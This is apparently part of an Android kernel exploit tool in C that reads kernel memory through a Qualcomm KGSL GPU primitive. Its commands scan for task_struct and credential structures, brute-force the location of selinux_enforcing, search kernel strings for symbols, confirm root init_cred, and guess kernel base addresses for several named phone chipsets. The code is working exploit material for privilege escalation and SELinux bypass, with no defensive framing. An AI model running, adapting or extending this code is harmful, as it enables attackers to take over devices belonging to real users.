                            "task_struct",
                            "kmem_cache",
                            "mdss_fb",
                            "init_cred_cache",
                            "do_group_exit",
                            "commit_creds",
                            "prepare_kernel_cred",
                            "override_creds",
                            "revert_creds",
                            "abort_creds",
                        };
                        for (size_t gi = 0;
                             gi < sizeof(kglobals)/sizeof(kglobals[0]);
                             gi++) {
                            int glen = (int)strlen(kglobals[gi]);
                            void *gp = memmem(buf, PAGE_SIZE, kglobals[gi], glen);
                            if (gp) {
                                found_sig = 8;
                                found_off = (int)((uint8_t*)gp - buf);
                                break;
                            }
                        }
                    }
                    // 17. Comm-like field — 4-7 byte ASCII string followed
                    //     by NUL padding within the next 8 bytes. This
                    //     pattern matches ANY process comm field, not just
                    //     known kernel comms. Catches our spray sleep
                    //     processes whose comm was set to "KETO0422" /
                    //     "KETW0NNN" / "sleep" via prctl, AND any
                    //     arbitrary user process whose task_struct lands
                    //     in KGSL range. Lower confidence (75) so we
                    //     verify via comm_at_known_offset check.
                    if (!found_sig) {
                        const char *qc = (const char *)buf;
                        for (int i = 0; i <= PAGE_SIZE - 16; i++) {
                            // Need 4+ printable ASCII bytes in a row
                            int run = 0, run_start = i;
                            while (i < PAGE_SIZE && run < 16) {
                                uint8_t c = qc[i];
                                if (0x20 <= c && c <= 0x7e) {
                                    run++; i++;
                                } else break;
                            }
                            if (run >= 4) {
                                // NUL padding: at least 4 NULs in the
                                // next 12 bytes (typical for 16-byte
                                // comm field with short process name).
                                int nulls = 0;
                                for (int j = 0; j < 12; j++) {
                                    if (i + j >= PAGE_SIZE) break;
                                    if (qc[i + j] == 0) nulls++;
                                }
                                if (nulls >= 4) {
                                    found_sig = 17;
                                    found_off = run_start;
                                    break;
                                }
                            }
                            // Skip ahead — don't restart inside the
                            // run we just measured.
                        }
                    }

                    if (found_sig) {
                        printf("MATCH:%lx:%d:%d\n", (unsigned long)va, found_sig, found_off);
                        printf("DATA:%lx:%d\n", (unsigned long)va, PAGE_SIZE);
                        fwrite(buf, 1, PAGE_SIZE, stdout);
                        printf("\nDATA_END\n");
                        pages_hit++;
                    }
                } else {
                    pages_failed++;
                }
                scanned += PAGE_SIZE;
                if ((va / PAGE_SIZE) % 100 == 0) {
                    fprintf(stderr, "[SCAN] progress 0x%lx / 0x%lx (%lu%%)\n",
                            (unsigned long)scanned, (unsigned long)total,
                            (unsigned long)(100 * scanned / total));
                    fflush(stderr);
                    printf("PROGRESS:%lx:%lx\n", (unsigned long)scanned, (unsigned long)total);
                    fflush(stdout);
                    usleep(1000);
                }
            }
            fprintf(stderr, "[SCAN] done read=%d failed=%d empty=%d nonzero=%d hits=%d\n",
                    pages_read, pages_failed, pages_empty, pages_nonzero, pages_hit);
            fflush(stderr);
            printf("SCAN_DONE:r=%d:f=%d:e=%d:n=%d:h=%d\n",
                   pages_read, pages_failed, pages_empty,
                   pages_nonzero, pages_hit);
            fflush(stdout);
        } else if (strncmp(line, "selsearch ", 10) == 0) {
            // Brute-force scan for selinux_enforcing in a kernel data range.
            // Usage: selsearch <start_va> <end_va> [step=0x1000]
            // Strategy: read 3 times at each candidate page, accept if the
            // first u32 is stable AND in {0,1,2,3,0xff} AND the page has
            // some non-zero data nearby. Prints up to 16 hits as
            //   SELSEARCH:HIT:<va>:<val>:<nz>:<ptr>
            // and a final SELSEARCH:DONE.
            uint64_t start, end, step = 0x1000;
            int n = sscanf(line + 10, "%lx %lx %lx", &start, &end, &step);
            if (n < 2) { printf("BAD_ARGS\n"); fflush(stdout); continue; }
            if (n < 3 || step < 0x100) step = 0x1000;
            if (step > 0x10000) step = 0x10000;
            int hits = 0;
            for (uint64_t cur = start; cur < end && hits < 16; cur += step) {
                uint8_t p1[4096], p2[4096], p3[4096];
                int ok1 = (read_gpu_page(cur, p1) == 0);
                usleep(1500);
                int ok2 = (read_gpu_page(cur, p2) == 0);
                usleep(1500);
                int ok3 = (read_gpu_page(cur, p3) == 0);
                if (!ok1 || !ok2 || !ok3) continue;
                uint32_t v1, v2, v3;
                memcpy(&v1, p1, 4); memcpy(&v2, p2, 4); memcpy(&v3, p3, 4);
                if (v1 != v2 || v2 != v3) continue;
                // Acceptable values: 0, 1 (enforcing), 2, 3 (permissive states),
                // and 0xff (some kernels init to -1)
                if (v1 != 0 && v1 != 1 && v1 != 2 && v1 != 3 && v1 != 0xff &&
                    v1 != 0xffffffffU) continue;
                int nz = 0, has_ptr = 0;
                for (int i = 0; i < 4096; i++) if (p1[i] != 0) nz++;
                for (int i = 0; i + 8 <= 4096; i += 8) {
                    uint64_t kp; memcpy(&kp, p1 + i, 8);
                    if ((kp >> 32) >= 0xffffff80 &&
                        (kp >> 40) <= 0xffffffcf && kp != 0) {
                        has_ptr = 1; break;
                    }
                }
                if (nz < 8) continue;  // skip all-zero pages
                printf("SELSEARCH:HIT:%lx:%u:nz=%d:ptr=%d\n",
                       (unsigned long)cur, v1, nz, has_ptr);
                fflush(stdout);
                hits++;
            }
            printf("SELSEARCH:DONE:%d\n", hits);
            fflush(stdout);
        } else if (strncmp(line, "symlook ", 8) == 0) {
            // Search the kernel .rodata / .text for a string and report
            // the VA where it's first found. Useful for finding the
            // address of "selinux_enforcing" / "selinux_enabled" by name.
            // Usage: symlook <kbase> <end_va> <string...>
            // Prints SYMLOOK:FOUND:<va> or SYMLOOK:NOTFOUND.
            uint64_t kbase, end;
            char needle[64];
            int n = sscanf(line + 8, "%lx %lx %63s", &kbase, &end, needle);
            if (n < 3) { printf("BAD_ARGS\n"); fflush(stdout); continue; }
            int nlen = (int)strlen(needle);
            int found = 0;
            // Scan in 64KB chunks
            for (uint64_t cur = kbase; cur < end; cur += 0x10000) {
                uint8_t big[0x10000];
                int pages = 16;
                if (cur + pages * PAGE_SIZE > end) pages = (int)((end - cur) / PAGE_SIZE);
                if (pages <= 0) break;
                if (read_gpu_pages(cur, big, pages) != 0) continue;
                uint8_t *p = memmem(big, pages * PAGE_SIZE, needle, nlen);
                if (p) {
                    uint64_t va = cur + (uint64_t)((uint8_t*)p - big);
                    printf("SYMLOOK:FOUND:%lx\n", (unsigned long)va);
                    fflush(stdout);
                    found = 1;
                    break;
                }
            }
            if (!found) {
                printf("SYMLOOK:NOTFOUND\n");
                fflush(stdout);
            }
        } else if (strncmp(line, "cred ", 5) == 0) {
            // Strict init_cred verification: read and check structure
            uint64_t va;
            sscanf(line + 5, "%lx", &va);
            uint8_t p1[PAGE_SIZE], p2[PAGE_SIZE];
            int ok1 = (read_gpu_page(va, p1) == 0);
            usleep(2000);
            int ok2 = (read_gpu_page(va, p2) == 0);
            if (!ok1 || !ok2) {
                printf("CRED:READ_FAIL:%lx\n", (unsigned long)va);
            } else {
                // struct cred { atomic_t usage; kuid_t uid,gid,suid,sgid,euid,egid; ... }
                // Layout: u32 usage, u32 uid, u32 gid, u32 suid, u32 sgid, u32 euid, u32 egid
                uint32_t usage1, uid1, gid1, usage2, uid2, gid2;
                memcpy(&usage1, p1 + 0,  4);
                memcpy(&uid1,   p1 + 4,  4);
                memcpy(&gid1,   p1 + 8,  4);
                memcpy(&usage2, p2 + 0,  4);
                memcpy(&uid2,   p2 + 4,  4);
                memcpy(&gid2,   p2 + 8,  4);
                if (usage1 != usage2 || uid1 != uid2 || gid1 != gid2) {
                    printf("CRED:UNSTABLE:%lx:u=%u/%u id=%u/%u\n",
                           (unsigned long)va, usage1, usage2, uid1, uid2);
                } else if (uid1 == 0 && gid1 == 0 && usage1 > 0 && usage1 < 100) {
                    // Looks like root init_cred (uid=gid=0, low usage count)
                    printf("CRED:OK:%lx:usage=%u:uid=%u:gid=%u:root\n",
                           (unsigned long)va, usage1, uid1, gid1);
                } else if (uid1 == uid2 && gid1 == gid2) {
                    printf("CRED:OK:%lx:usage=%u:uid=%u:gid=%u\n",
                           (unsigned long)va, usage1, uid1, gid1);
                } else {
                    printf("CRED:FAIL:%lx\n", (unsigned long)va);
                }
            }
            fflush(stdout);
        } else if (strncmp(line, "selinux ", 8) == 0) {
            // Strict SELinux enforcing: 3 reads, must be stable 0/1, AND page
            // must have non-zero data (real .data/.bss page, not zero-filled)
            uint64_t va;
            sscanf(line + 8, "%lx", &va);
            uint8_t p1[PAGE_SIZE], p2[PAGE_SIZE], p3[PAGE_SIZE];
            int ok1 = (read_gpu_page(va, p1) == 0);
            usleep(2000);
            int ok2 = (read_gpu_page(va, p2) == 0);
            usleep(2000);
            int ok3 = (read_gpu_page(va, p3) == 0);
            if (!ok1 || !ok2 || !ok3) {
                printf("SELINUX:READ_FAIL:%lx\n", (unsigned long)va);
            } else {
                uint32_t v1, v2, v3;
                memcpy(&v1, p1, 4);
                memcpy(&v2, p2, 4);
                memcpy(&v3, p3, 4);
                if (v1 == v2 && v2 == v3 && (v1 == 0 || v1 == 1)) {
                    int nonzero = 0;
                    int has_pointer = 0;
                    for (int i = 0; i < PAGE_SIZE; i++) {
                        if (p1[i] != 0) nonzero++;
                    }
                    for (int i = 0; i < PAGE_SIZE - 8; i += 8) {
                        uint64_t kp;
                        memcpy(&kp, p1 + i, 8);
                        if ((kp >> 32) >= 0xffffff80 && (kp >> 40) <= 0xffffffcf && kp != 0) {
                            has_pointer = 1;
                            break;
                        }
                    }
                    if (nonzero < 32) {
                        // Page is mostly zero — not a real kernel data page
                        printf("SELINUX:ZERO_PAGE:%lx:val=%u:nonzero=%d\n",
                               (unsigned long)va, v1, nonzero);
                    } else if (nonzero < 128) {
                        printf("SELINUX:WEAK:%lx:val=%u:nonzero=%d:ptr=%d\n",
                               (unsigned long)va, v1, nonzero, has_pointer);
                    } else {
                        printf("SELINUX:OK:%lx:%u:stable:nz=%d:ptr=%d\n",
                               (unsigned long)va, v1, nonzero, has_pointer);
                    }
                } else if (v1 == v2 && v2 == v3) {
                    printf("SELINUX:UNSTABLE:%lx:%u:stable_not_01\n",
                           (unsigned long)va, v1);
                } else {
                    printf("SELINUX:FAIL:%lx:%u:%u:%u\n",
                           (unsigned long)va, v1, v2, v3);
                }
            }
            fflush(stdout);
        } else if (strncmp(line, "kbase", 5) == 0) {
            // Auto-find kernel base by trying known addresses.
            // Includes 0xffffff8c… (SD888/Asus ROG 5S), 0xffffffaf…
            // (Tensor/Exynos), 0xffffffb0… (Kirin), 0xffffff95…
            // (MediaTek), etc.
            uint64_t bases[] = {
                0xffffffc000000000ULL, 0xffffffc010000000ULL,
                0xffffffc020000000ULL, 0xffffffc030000000ULL,
                0xffffffc035000000ULL, 0xffffffc040000000ULL,
                0xffffffc008200000ULL, 0xffffffb000000000ULL,
                0xffffffa000000000ULL, 0xffffffaf00000000ULL,
                0xffffffaf20000000ULL, 0xffffff9550000000ULL,
                0xffffff94d0000000ULL, 0xffffff8e70000000ULL,
                // From user screenshot — 0xffffff8cc1000000 (SD888)
                0xffffff8c00000000ULL, 0xffffff8c10000000ULL,
                0xffffff8cc0000000ULL, 0xffffff8cc1000000ULL,
                0xffffff8cd0000000ULL, 0xffffff8c80000000ULL,
                0xffffff8d00000000ULL,
                // More AArch64 ranges
                0xffffffaf10000000ULL, 0xffffffb010000000ULL,
                0xffffffb020000000ULL,
            };
            uint8_t page[PAGE_SIZE];
            int found = 0;
            for (size_t i = 0; i < sizeof(bases) / sizeof(bases[0]); i++) {
                if (read_gpu_page(bases[i], page) == 0) {
                    if (page[0] == 0x7f && page[1] == 'E' &&
                        page[2] == 'L' && page[3] == 'F') {
                        printf("KBASE:%lx\n", (unsigned long)bases[i]);
                        fflush(stdout);
                        found = 1;
                        break;
                    }
                }
                // Also check selinux at multiple offsets — accept ANY
                // selinux candidate that looks valid (sel<=1 + nonzero page)
                uint64_t sel_offs[] = {
                    0x02caa000ULL, 0x2f74ce8ULL, 0x2f84ce8ULL,
                    0x32aace8ULL, 0x3709ce8ULL, 0x3b3ace8ULL,
                };
                for (size_t j = 0; j < sizeof(sel_offs) / sizeof(sel_offs[0]); j++) {
                    uint32_t sel = 0;
                    uint64_t sel_va = bases[i] + sel_offs[j];
                    if (read_gpu_page(sel_va, page) == 0) {
                        memcpy(&sel, page, 4);
                        if (sel <= 1) {
                            int nz = 0;
                            for (int k = 0; k < 128; k++) if (page[k] != 0) nz++;
                            if (nz >= 32) {
                                printf("KBASE:%lx\n", (unsigned long)bases[i]);
                                printf("SELINUX:%lx\n", (unsigned long)sel_va);
                                fflush(stdout);
                                found = 1;
                                break;
                            }
                        }
                    }
                }
                if (found) break;
            }
            if (!found) printf("KBASE_FAILED\n");
        } else if (strncmp(line, "quit", 4) == 0) {
            break;
        }
    }

    cleanup_kgsl();
    return 0;
}
